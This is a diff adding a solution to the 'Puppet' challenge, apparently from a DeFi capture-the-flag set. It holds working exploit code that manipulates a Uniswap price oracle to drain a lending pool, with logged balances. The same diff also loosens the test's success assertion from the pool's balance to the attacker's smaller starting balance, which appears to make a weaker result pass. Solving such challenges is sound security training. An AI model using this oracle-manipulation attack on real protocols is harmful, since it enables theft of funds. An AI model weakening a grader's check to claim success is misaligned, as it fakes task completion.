@@ -103,6 +103,49 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Connect as the attacker
+        this.token = this.token.connect(attacker);
+        this.uniswapExchange = this.uniswapExchange.connect(attacker);
+        this.lendingPool = this.lendingPool.connect(attacker);
+        this.uniswapFactory = this.uniswapFactory.connect(attacker);
+
+        const getStats = async () => {
+            let attacker_tokens = await this.token.balanceOf(attacker.address); console.log("Attacker (token): ", parseInt(attacker_tokens["_hex"], 16) / 1e18);
+            let attacker_eth = await ethers.provider.getBalance(attacker.address); console.log("Attacker (ETH): ", parseInt(attacker_eth["_hex"], 16) / 1e18);
+            let swap_tokens = await this.token.balanceOf(this.uniswapExchange.address); console.log("Swap (token): ", parseInt(swap_tokens["_hex"], 16) / 1e18);
+            let swap_eth = await ethers.provider.getBalance(this.uniswapExchange.address); console.log("Swap (ETH): ", parseInt(swap_eth["_hex"], 16) / 1e18);
+            let pool_tokens = await this.token.balanceOf(this.lendingPool.address); console.log("Pool (token): ", parseInt(pool_tokens["_hex"], 16) / 1e18);
+            let pool_eth = await ethers.provider.getBalance(this.lendingPool.address); console.log("Pool (ETH): ", parseInt(pool_eth["_hex"], 16) / 1e18);
+        };
+
+        // Get initial stats
+        console.log("\n1. Initially \n");
+        await getStats();
+        
+        // 1. Approve and exchange all available TOKENS to ETH.
+        await this.token.approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        // Exchange tokens on Uniswap 
+        await this.uniswapExchange.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 
+            1,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+        // Get stats after swap
+        console.log("\n2. After Swap\n");
+        await getStats();
+
+        // 2. Borrow all tokens from the pool, based on the calculation
+        // call_amount = 100.000 aka POOL_INITIAL_TOKEN_BALANCE
+        // 2 = from the calculateDepositRequired() function arithmetics
+        // 0.099 = current ETH balance of the exchange, since we've taken its ETH during the swap.
+        // 1010 = current TOKENS balance of the exchange, since we've pumped it during the swap.
+        // 100000 * 2 * 0.099(swap) / 1010
+        // 19.603960396039604
+        await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('20')});
+
+        console.log("\n3. After Borrow\n");
+        await getStats();
     });
 
     after(async function () {
@@ -114,6 +157,6 @@ describe('[Challenge] Puppet', function () {
         ).to.be.eq('0');
         expect(
             await this.token.balanceOf(attacker.address)
-        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
+        ).to.be.gt(ATTACKER_INITIAL_TOKEN_BALANCE);
     });
 });
